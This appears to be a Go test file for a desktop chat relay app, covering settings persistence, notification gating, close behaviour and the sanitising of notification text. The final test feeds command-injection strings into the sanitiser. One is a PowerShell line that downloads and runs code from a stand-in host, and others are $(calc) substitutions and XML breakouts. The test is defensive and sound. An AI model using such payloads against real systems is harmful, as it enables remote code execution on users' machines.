package main

import (
	"os"
	"path/filepath"
	"strings"
	"testing"

	"altnet-relay/engine"
)

func TestSettingsDefaultToAlwaysOn(t *testing.T) {
	s := loadSettings(t.TempDir())
	if !s.Background || !s.Notifications || s.ToldBackground {
		t.Fatalf("a new install keeps running and notifies: %+v", s)
	}
}

func TestSettingsSurviveARestart(t *testing.T) {
	dir := t.TempDir()
	if err := saveSettings(dir, Settings{Background: false, Notifications: true, ToldBackground: true}); err != nil {
		t.Fatal(err)
	}
	got := loadSettings(dir)
	if got.Background || !got.Notifications || !got.ToldBackground {
		t.Fatalf("settings should come back as saved: %+v", got)
	}
}

func TestDamagedOrPartialSettingsAreSafe(t *testing.T) {
	dir := t.TempDir()
	if err := os.WriteFile(filepath.Join(dir, settingsFile), []byte("{ not json"), 0o600); err != nil {
		t.Fatal(err)
	}
	if s := loadSettings(dir); !s.Background || !s.Notifications {
		t.Fatalf("a damaged file means the defaults: %+v", s)
	}
	// A file from an older version that doesn't mention a choice must not
	// switch it off: it keeps the default.
	if err := os.WriteFile(filepath.Join(dir, settingsFile), []byte(`{"background": false}`), 0o600); err != nil {
		t.Fatal(err)
	}
	s := loadSettings(dir)
	if s.Background || !s.Notifications {
		t.Fatalf("only what the file says changes: %+v", s)
	}
}

func newTestApp(t *testing.T) *App {
	t.Helper()
	a := NewApp(engine.Config{DataDir: t.TempDir()})
	a.bg.settings = defaultSettings()
	return a
}

// Desktop notifications are for when the window isn't being looked at -- and
// never when the person has turned them off.
func TestNotificationsOnlyWhenNotLookingAndEnabled(t *testing.T) {
	a := newTestApp(t)
	a.bg.focused.Store(false)
	if !a.shouldAlert() {
		t.Fatal("window not in front: a message should notify")
	}
	a.bg.focused.Store(true)
	if a.shouldAlert() {
		t.Fatal("window in front: no desktop notification, the window shows it")
	}
	a.bg.focused.Store(false)
	if err := a.SetSetting("notifications", false); err != nil {
		t.Fatal(err)
	}
	if a.shouldAlert() {
		t.Fatal("notifications turned off must stay off")
	}
	if loadSettings(a.cfg.DataDir).Notifications {
		t.Fatal("turning them off must be remembered")
	}
}

func TestClosingReallyClosesWhenAskedTo(t *testing.T) {
	a := newTestApp(t)
	// Background off: the close button closes (returns "don't prevent").
	if err := a.SetSetting("background", false); err != nil {
		t.Fatal(err)
	}
	if a.beforeClose(nil) {
		t.Fatal("with background off, closing the window must close the app")
	}
	// Quitting from the tray or the Account dialog always closes.
	b := newTestApp(t)
	b.bg.quitting.Store(true)
	if b.beforeClose(nil) {
		t.Fatal("quitting must never be turned into hiding")
	}
}

func TestUnknownSettingIsRefused(t *testing.T) {
	a := newTestApp(t)
	if err := a.SetSetting("nonsense", true); err == nil {
		t.Fatal("an unknown setting should be an error")
	}
}

// Group names are chosen by whoever invites you, and on Windows a
// notification's text could break out into XML and then into a PowerShell
// fallback that runs "$(...)". Nothing of that kind may reach a notification.
func TestNotificationTextIsPlain(t *testing.T) {
	for _, evil := range []string{
		"]]><$(iwr evil.example|iex)",
		"x\"@\n$(calc)",
		"`$(calc)` <toast> & [x]",
		"a\r\nb",
	} {
		got := toastText("You're invited to " + evil)
		if strings.ContainsAny(got, "$`\"<>&[]\r\n") {
			t.Errorf("toastText(%q) = %q, still has a special character", evil, got)
		}
	}
	if got := toastText("New message in #design · Příliš žluťoučký kůň (general)"); got != "New message in #design · Příliš žluťoučký kůň (general)" {
		t.Errorf("ordinary text changed: %q", got)
	}
	if got := toastText(strings.Repeat("a", 500)); len(got) > maxToastText {
		t.Errorf("not shortened: %d characters", len(got))
	}
}
